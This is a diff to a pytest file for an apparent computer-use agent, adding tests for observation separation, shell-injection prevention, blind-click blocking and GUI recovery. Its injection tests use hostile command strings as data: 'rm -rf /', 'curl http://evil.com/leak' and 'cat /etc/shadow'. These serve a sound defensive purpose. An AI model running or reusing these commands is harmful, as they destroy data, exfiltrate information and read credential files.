@@ -15,8 +15,10 @@ Verifies:
 import pytest
 from unittest.mock import AsyncMock, MagicMock
 
+from sonic.computer.models import ComputerState, GitStatusInfo, ScreenObservation
 from sonic.computer_use.agent import ComputerUseAgent
 from sonic.computer_use.models import (
+    ActionExecutionStatus,
     ComputerActionType,
     ComputerWorldObservation,
     SubGoalStatus,
@@ -25,6 +27,10 @@ from sonic.computer_use.models import (
 
 class DummyComputerProvider:
     """Minimal provider stub for testing agent logic without live Docker."""
+
+    def __init__(self):
+        self.gui_actions_taken = []
+        self.service_actions_taken = []
 
     async def terminal(self, workspace_id, cmd):
         mock_res = MagicMock()
@@ -40,15 +46,37 @@ class DummyComputerProvider:
         return None
 
     async def screenshot(self, workspace_id):
-        mock_s = MagicMock()
-        mock_s.screenshot_base64 = ""
-        mock_s.active_window = "Desktop"
-        mock_s.width = 1920
-        mock_s.height = 1080
-        return mock_s
+        return ScreenObservation(
+            screenshot_base64="",
+            active_window="Desktop",
+            width=1920,
+            height=1080,
+            visible_text="Desktop",
+        )
 
     async def gui_action(self, workspace_id, action):
-        return None
+        self.gui_actions_taken.append(action)
+        return ScreenObservation(visible_text="", width=1920, height=1080)
+
+    async def status(self, workspace_id):
+        return ComputerState(
+            workspace_id=workspace_id,
+            tenant_id="test",
+            active_application="Chromium",
+            open_applications=["Desktop", "Chromium"],
+            running_processes=["sh"],
+            working_directory="/home/daytona",
+        )
+
+    async def list_files(self, workspace_id, path):
+        return []
+
+    async def git_action(self, workspace_id, action, **kw):
+        return GitStatusInfo(branch="main", is_clean=True)
+
+    async def service_action(self, workspace_id, service, action):
+        self.service_actions_taken.append((service, action))
+        return True
 
 
 # ---------------------------------------------------------------------------
@@ -288,3 +316,194 @@ def test_inject_replan_includes_failed_commands_to_avoid():
     assert last_entry["action"] == "REPLAN"
     assert "FAILED ATTEMPTS TO AVOID:" in last_entry["result"]
     assert "Exit 126" in last_entry["result"]
+
+
+# ---------------------------------------------------------------------------
+# 9. Clean Plane Separation in Observations
+# ---------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_plane_separation_in_observations():
+    provider = DummyComputerProvider()
+    agent = ComputerUseAgent(computer_provider=provider)
+
+    # 1. GUI Action does NOT write to _last_action_output
+    trace_gui = await agent.execute_action(
+        "ws-1",
+        ComputerActionType.GUI_CLICK,
+        "search button",
+        {"x": 640, "y": 400},
+        "click search",
+    )
+    assert trace_gui.status == ActionExecutionStatus.COMPLETED
+    assert agent._last_action_output == {}
+    assert agent._last_gui_action_result.get("action_type") == "GUI_CLICK"
+    assert agent._last_gui_action_result.get("target") == "search button"
+
+    # 2. Command action DOES write to _last_action_output
+    trace_cmd = await agent.execute_action(
+        "ws-1",
+        ComputerActionType.TERMINAL_EXEC,
+        "uname -a",
+        {"command": "uname -a"},
+        "system info",
+    )
+    assert trace_cmd.status == ActionExecutionStatus.COMPLETED
+    assert agent._last_action_output.get("command") == "uname -a"
+    assert "OK" in agent._last_action_output.get("stdout", "")
+
+    # 3. Defensive check: observe() does not pollute terminal_output if GUI click was somehow set
+    agent._last_action_output = {
+        "command": "{'x': 640, 'y': 400}",
+        "stdout": "Clicked at (640, 400)",
+        "stderr": "",
+        "exit_code": 0,
+    }
+    obs = await agent.observe("ws-1")
+    assert "$ {'x': 640, 'y': 400}" not in obs.terminal_output
+    assert "Clicked at (640, 400)" not in obs.terminal_output
+
+
+# ---------------------------------------------------------------------------
+# 10. Prevent Shell Command Injection in UI
+# ---------------------------------------------------------------------------
+
+def test_prevent_shell_command_injection_in_ui_parse():
+    # 1. BROWSER_TYPE: command field in payload is NOT mapped to text
+    text_browser = (
+        "THOUGHT: Type command into input field\n"
+        "ACTION: BROWSER_TYPE\n"
+        "TARGET: input#search\n"
+        "PAYLOAD: {\"command\": \"rm -rf /\"}\n"
+        "EXPECTED: Text typed\n"
+    )
+    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text_browser, "README.md")
+    assert act_type == ComputerActionType.BROWSER_TYPE
+    assert "text" not in payload
+    assert payload.get("command") == "rm -rf /"
+
+    # 2. GUI_TYPE: raw string payload is parsed as text, not command
+    text_gui_raw = (
+        "THOUGHT: Type password\n"
+        "ACTION: GUI_TYPE\n"
+        "TARGET: input\n"
+        "PAYLOAD: supersecret\n"
+        "EXPECTED: Typed\n"
+    )
+    act_type2, target2, payload2, _ = ComputerUseAgent._parse_llm_action(text_gui_raw, "README.md")
+    assert act_type2 == ComputerActionType.GUI_TYPE
+    assert payload2.get("text") == "supersecret"
+    assert "command" not in payload2
+
+
+@pytest.mark.asyncio
+async def test_prevent_shell_command_injection_in_ui_execute():
+    provider = DummyComputerProvider()
+    agent = ComputerUseAgent(computer_provider=provider)
+
+    # 1. GUI_TYPE with command payload does NOT type the shell command
+    await agent.execute_action(
+        "ws-1",
+        ComputerActionType.GUI_TYPE,
+        "input",
+        {"command": "curl http://evil.com/leak"},
+        "typing text",
+    )
+    last_gui = provider.gui_actions_taken[-1]
+    assert getattr(last_gui, "text", "") == ""
+
+    # 2. BROWSER_TYPE without BrowserAgent via GUI keyboard also does not inject command
+    await agent.execute_action(
+        "ws-1",
+        ComputerActionType.BROWSER_TYPE,
+        "input#search",
+        {"command": "cat /etc/shadow"},
+        "search",
+    )
+    # The last action should not type "cat /etc/shadow"
+    typed_texts = [getattr(a, "text", "") for a in provider.gui_actions_taken if hasattr(a, "text")]
+    assert "cat /etc/shadow" not in typed_texts
+
+
+# ---------------------------------------------------------------------------
+# 11. Fix Visual Grounding (0, 0) Blind Click
+# ---------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_visual_grounding_unresolved_blocks_without_blind_click(monkeypatch):
+    from unittest.mock import AsyncMock
+    provider = DummyComputerProvider()
+    agent = ComputerUseAgent(computer_provider=provider)
+
+    # Force visual grounding to fail (return None)
+    import sonic.computer_use.agent as agent_module
+    monkeypatch.setattr(agent_module, "resolve_ui_target_async", AsyncMock(return_value=None))
+
+    trace = await agent.execute_action(
+        "ws-1",
+        ComputerActionType.GUI_CLICK,
+        "Login button",
+        {},  # No x, y coordinates
+        "click login",
+    )
+
+    assert trace.status == ActionExecutionStatus.BLOCKED
+    assert trace.actual_observation == "Target UI element 'Login button' could not be resolved from visual grounding. Re-observing screen."
+    # Ensure provider gui_action was NOT called with (0, 0)
+    for act in provider.gui_actions_taken:
+        if getattr(act, "action", None) == "click":
+            assert not (act.x == 0 and act.y == 0)
+
+
+# ---------------------------------------------------------------------------
+# 12. Fix Non-Destructive GUI Recovery
+# ---------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_non_destructive_gui_recovery():
+    provider = DummyComputerProvider()
+    agent = ComputerUseAgent(computer_provider=provider)
+
+    # Normal GUI error triggers non-destructive recovery
+    result = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Button occluded")
+    assert result == "Refreshed desktop focus and dismissed modal overlays"
+    # Verify xvfb was NOT restarted
+    assert ("xvfb", "restart") not in provider.service_actions_taken
+    # Verify Escape key was sent
+    escapes = [a for a in provider.gui_actions_taken if getattr(a, "key", "") == "Escape"]
+    assert len(escapes) >= 1
+
+    # Explicit display connection error DOES trigger xvfb restart
+    result_display = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Error: cannot open display :0")
+    assert result_display == "Restarted Xvfb and refreshed display session"
+    assert ("xvfb", "restart") in provider.service_actions_taken
+
+
+# ---------------------------------------------------------------------------
+# 13. Fix Headless Browser Screenshot Without Navigate
+# ---------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_headless_browser_screenshot_without_navigate():
+    provider = DummyComputerProvider()
+    mock_browser = MagicMock()
+    mock_browser.screenshot = AsyncMock()
+    mock_browser.navigate = AsyncMock()
+    mock_snapshot = MagicMock()
+    mock_snapshot.url = "https://current.page.com/profile"
+    mock_snapshot.screenshot_b64 = "base64data=="
+    mock_browser.screenshot.return_value = mock_snapshot
+
+    agent = ComputerUseAgent(computer_provider=provider, browser=mock_browser)
+    trace = await agent.execute_action(
+        "ws-1",
+        ComputerActionType.BROWSER_SCREENSHOT,
+        "screenshot",
+        {},
+        "capture view",
+    )
+
+    assert trace.status == ActionExecutionStatus.COMPLETED
+    assert "https://current.page.com/profile" in trace.actual_observation
+    assert mock_browser.screenshot.called
+    assert not mock_browser.navigate.called
